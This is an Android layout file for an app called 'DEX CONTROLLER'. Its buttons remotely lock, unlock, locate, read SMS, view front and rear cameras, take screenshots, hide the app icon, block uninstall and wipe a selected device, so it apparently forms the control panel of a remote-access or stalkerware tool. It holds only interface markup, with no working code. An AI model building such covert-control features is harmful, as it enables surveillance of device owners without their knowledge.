@@ -1,0 +1,363 @@
+<?xml version="1.0" encoding="utf-8"?>
+<androidx.coordinatorlayout.widget.CoordinatorLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:app="http://schemas.android.com/apk/res-auto"
+    xmlns:tools="http://schemas.android.com/tools"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    android:background="@color/surface"
+    tools:context=".MainActivity">
+
+    <com.google.android.material.appbar.AppBarLayout
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:background="@color/surface"
+        app:elevation="0dp">
+
+        <LinearLayout
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:orientation="vertical"
+            android:paddingHorizontal="24dp"
+            android:paddingTop="28dp"
+            android:paddingBottom="16dp">
+
+            <TextView
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:text="DEX CONTROLLER"
+                android:textColor="@color/primary"
+                android:textSize="22sp"
+                android:letterSpacing="0.1"
+                android:fontFamily="sans-serif-black"/>
+
+            <com.google.android.material.card.MaterialCardView
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:layout_marginTop="20dp"
+                app:cardCornerRadius="24dp"
+                app:cardElevation="0dp"
+                app:cardBackgroundColor="@color/surfaceVariant"
+                app:strokeWidth="1dp"
+                app:strokeColor="#1AFFFFFF">
+
+                <LinearLayout
+                    android:layout_width="match_parent"
+                    android:layout_height="56dp"
+                    android:gravity="center_vertical"
+                    android:paddingHorizontal="20dp">
+
+                    <View
+                        android:id="@+id/statusIndicator"
+                        android:layout_width="10dp"
+                        android:layout_height="10dp"
+                        android:background="@drawable/status_dot"/>
+
+                    <Spinner
+                        android:id="@+id/deviceSpinner"
+                        android:layout_width="0dp"
+                        android:layout_height="match_parent"
+                        android:layout_weight="1"
+                        android:layout_marginStart="12dp"
+                        android:background="@null"
+                        android:overlapAnchor="false"
+                        android:dropDownVerticalOffset="8dp"
+                        android:dropDownWidth="match_parent"
+                        android:popupElevation="8dp"
+                        android:popupBackground="@drawable/spinner_dropdown_bg"
+                        android:spinnerMode="dropdown"/>
+
+                    <TextView
+                        android:id="@+id/statusText"
+                        android:layout_width="wrap_content"
+                        android:layout_height="wrap_content"
+                        android:text="OFFLINE"
+                        android:textColor="@color/onSurfaceVariant"
+                        android:textSize="11sp"
+                        android:letterSpacing="0.05"
+                        android:fontFamily="sans-serif-medium"/>
+                </LinearLayout>
+            </com.google.android.material.card.MaterialCardView>
+        </LinearLayout>
+
+        <com.google.android.material.tabs.TabLayout
+            android:id="@+id/tabLayout"
+            android:layout_width="match_parent"
+            android:layout_height="54dp"
+            android:background="@color/surface"
+            app:tabIndicatorHeight="2dp"
+            app:tabIndicatorFullWidth="false"
+            app:tabIndicatorColor="@color/primary"
+            app:tabSelectedTextColor="@color/primary"
+            app:tabTextColor="@color/onSurfaceVariant"
+            app:tabRippleColor="@android:color/transparent"
+            app:tabTextAppearance="@style/CustomTabText"
+            app:tabIndicatorGravity="bottom">
+            <com.google.android.material.tabs.TabItem android:text="CONTROL"/>
+            <com.google.android.material.tabs.TabItem android:text="CAMERA"/>
+            <com.google.android.material.tabs.TabItem android:text="SYSTEM"/>
+        </com.google.android.material.tabs.TabLayout>
+    </com.google.android.material.appbar.AppBarLayout>
+
+    <androidx.core.widget.NestedScrollView
+        android:layout_width="match_parent"
+        android:layout_height="match_parent"
+        app:layout_behavior="@string/appbar_scrolling_view_behavior">
+
+        <LinearLayout
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:orientation="vertical"
+            android:padding="20dp">
+
+            <!-- TAB CONTROL: Console + Buttons -->
+            <LinearLayout
+                android:id="@+id/tab_control"
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:orientation="vertical"
+                android:visibility="visible">
+
+                <com.google.android.material.card.MaterialCardView
+                    android:id="@+id/cardConsole"
+                    android:layout_width="match_parent"
+                    android:layout_height="220dp"
+                    app:cardCornerRadius="24dp"
+                    app:cardElevation="0dp"
+                    app:cardBackgroundColor="@color/surfaceVariant"
+                    app:strokeWidth="1dp"
+                    app:strokeColor="#0DFFFFFF">
+
+                    <ScrollView
+                        android:id="@+id/logScroll"
+                        android:layout_width="match_parent"
+                        android:layout_height="match_parent"
+                        android:padding="18dp">
+                        <TextView
+                            android:id="@+id/logText"
+                            android:layout_width="match_parent"
+                            android:layout_height="wrap_content"
+                            android:text="System initialized. Waiting for device..."
+                            android:textSize="12sp"
+                            android:fontFamily="monospace"
+                            android:lineSpacingExtra="4dp"
+                            android:textColor="@color/onSurfaceVariant"/>
+                    </ScrollView>
+                </com.google.android.material.card.MaterialCardView>
+
+                <GridLayout
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"
+                    android:layout_marginTop="20dp"
+                    android:columnCount="2">
+
+                    <com.google.android.material.button.MaterialButton
+                        android:id="@+id/btnLock"
+                        style="@style/AncientButton"
+                        android:layout_width="0dp"
+                        android:layout_height="64dp"
+                        android:layout_columnWeight="1"
+                        android:layout_margin="6dp"
+                        android:text="Lock"
+                        app:icon="@android:drawable/ic_lock_lock"/>
+
+                    <com.google.android.material.button.MaterialButton
+                        android:id="@+id/btnUnlock"
+                        style="@style/AncientButton"
+                        android:layout_width="0dp"
+                        android:layout_height="64dp"
+                        android:layout_columnWeight="1"
+                        android:layout_margin="6dp"
+                        android:text="Unlock"
+                        app:icon="@android:drawable/ic_partial_secure"/>
+
+                    <com.google.android.material.button.MaterialButton
+                        android:id="@+id/btnLocation"
+                        style="@style/AncientButton"
+                        android:layout_width="0dp"
+                        android:layout_height="64dp"
+                        android:layout_columnWeight="1"
+                        android:layout_margin="6dp"
+                        android:text="Location"
+                        app:icon="@android:drawable/ic_menu_mylocation"/>
+
+                    <com.google.android.material.button.MaterialButton
+                        android:id="@+id/btnSMS"
+                        style="@style/AncientButton"
+                        android:layout_width="0dp"
+                        android:layout_height="64dp"
+                        android:layout_columnWeight="1"
+                        android:layout_margin="6dp"
+                        android:text="SMS"
+                        app:icon="@android:drawable/sym_action_chat"/>
+
+                    <com.google.android.material.button.MaterialButton
+                        android:id="@+id/btnAntiUninstall"
+                        style="@style/AncientButton"
+                        android:layout_width="0dp"
+                        android:layout_height="64dp"
+                        android:layout_columnSpan="2"
+                        android:layout_columnWeight="2"
+                        android:layout_margin="6dp"
+                        android:text="Anti-Uninstall: OFF"
+                        app:icon="@android:drawable/ic_lock_power_off"/>
+                </GridLayout>
+            </LinearLayout>
+
+            <!-- TAB CAMERA: Live Feed + Buttons -->
+            <LinearLayout
+                android:id="@+id/tab_media"
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:orientation="vertical"
+                android:visibility="gone">
+
+                <com.google.android.material.card.MaterialCardView
+                    android:id="@+id/cardLiveFeed"
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"
+                    android:visibility="gone"
+                    android:minHeight="200dp"
+                    app:cardCornerRadius="24dp"
+                    app:cardElevation="0dp"
+                    app:cardBackgroundColor="@color/black">
+
+                    <RelativeLayout
+                        android:layout_width="match_parent"
+                        android:layout_height="wrap_content">
+                        <ImageView
+                            android:id="@+id/liveView"
+                            android:layout_width="match_parent"
+                            android:layout_height="wrap_content"
+                            android:adjustViewBounds="true"
+                            android:scaleType="fitCenter"
+                            android:alpha="0.8"/>
+
+                        <TextView
+                            android:id="@+id/placeholder"
+                            android:layout_width="wrap_content"
+                            android:layout_height="wrap_content"
+                            android:layout_centerInParent="true"
+                            android:text="NO SIGNAL"
+                            android:textColor="#33FFFFFF"
+                            android:letterSpacing="0.2"
+                            android:textSize="12sp"/>
+                    </RelativeLayout>
+                </com.google.android.material.card.MaterialCardView>
+
+                <GridLayout
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"
+                    android:layout_marginTop="20dp"
+                    android:columnCount="2">
+
+                    <com.google.android.material.button.MaterialButton
+                        android:id="@+id/btnScreenshot"
+                        style="@style/AncientButton"
+                        android:layout_width="match_parent"
+                        android:layout_height="64dp"
+                        android:layout_columnSpan="2"
+                        android:layout_margin="6dp"
+                        android:text="Take Screenshot"
+                        app:icon="@android:drawable/ic_menu_camera"/>
+
+                    <com.google.android.material.button.MaterialButton
+                        android:id="@+id/btnFrontCam"
+                        style="@style/AncientButton"
+                        android:layout_width="0dp"
+                        android:layout_height="64dp"
+                        android:layout_columnWeight="1"
+                        android:layout_margin="6dp"
+                        android:text="Front Camera"
+                        app:icon="@android:drawable/ic_menu_camera"/>
+
+                    <com.google.android.material.button.MaterialButton
+                        android:id="@+id/btnBackCam"
+                        style="@style/AncientButton"
+                        android:layout_width="0dp"
+                        android:layout_height="64dp"
+                        android:layout_columnWeight="1"
+                        android:layout_margin="6dp"
+                        android:text="Rear Camera"
+                        app:icon="@android:drawable/ic_menu_camera"/>
+                </GridLayout>
+            </LinearLayout>
+
+            <!-- TAB SYSTEM: Info + Settings -->
+            <LinearLayout
+                android:id="@+id/tab_system"
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:orientation="vertical"
+                android:visibility="gone">
+
+                <com.google.android.material.card.MaterialCardView
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"
+                    android:layout_marginBottom="20dp"
+                    app:cardCornerRadius="24dp"
+                    app:cardElevation="0dp"
+                    app:cardBackgroundColor="@color/surfaceVariant"
+                    app:strokeWidth="1dp"
+                    app:strokeColor="#1AFFFFFF">
+
+                    <LinearLayout
+                        android:layout_width="match_parent"
+                        android:layout_height="wrap_content"
+                        android:orientation="vertical"
+                        android:padding="20dp">
+
+                        <TextView
+                            android:layout_width="wrap_content"
+                            android:layout_height="wrap_content"
+                            android:text="DEVICE STATUS"
+                            android:textColor="@color/primary"
+                            android:textSize="11sp"
+                            android:letterSpacing="0.1"
+                            android:fontFamily="sans-serif-black"/>
+
+                        <TextView
+                            android:id="@+id/txtDeviceInfo"
+                            android:layout_width="match_parent"
+                            android:layout_height="wrap_content"
+                            android:layout_marginTop="12dp"
+                            android:text="No device information available."
+                            android:textColor="@color/onSurfaceVariant"
+                            android:textSize="13sp"
+                            android:lineSpacingExtra="6dp"
+                            android:fontFamily="monospace"/>
+                    </LinearLayout>
+                </com.google.android.material.card.MaterialCardView>
+
+                <com.google.android.material.button.MaterialButton
+                    android:id="@+id/btnCheckPerms"
+                    style="@style/AncientButton"
+                    android:layout_width="match_parent"
+                    android:layout_height="64dp"
+                    android:layout_margin="6dp"
+                    android:text="Check Permissions"
+                    app:icon="@android:drawable/ic_menu_agenda"/>
+
+                <com.google.android.material.button.MaterialButton
+                    android:id="@+id/btnHideIcon"
+                    style="@style/AncientButton"
+                    android:layout_width="match_parent"
+                    android:layout_height="64dp"
+                    android:layout_margin="6dp"
+                    android:text="Hide Icon: OFF"
+                    app:icon="@android:drawable/ic_menu_view"/>
+
+                <com.google.android.material.button.MaterialButton
+                    android:id="@+id/btnWipe"
+                    style="@style/AncientButton"
+                    android:layout_width="match_parent"
+                    android:layout_height="64dp"
+                    android:layout_margin="6dp"
+                    android:text="Wipe Data"
+                    android:textColor="@color/error"
+                    app:iconTint="@color/error"
+                    app:icon="@android:drawable/ic_menu_delete"/>
+            </LinearLayout>
+        </LinearLayout>
+    </androidx.core.widget.NestedScrollView>
+
+</androidx.coordinatorlayout.widget.CoordinatorLayout>
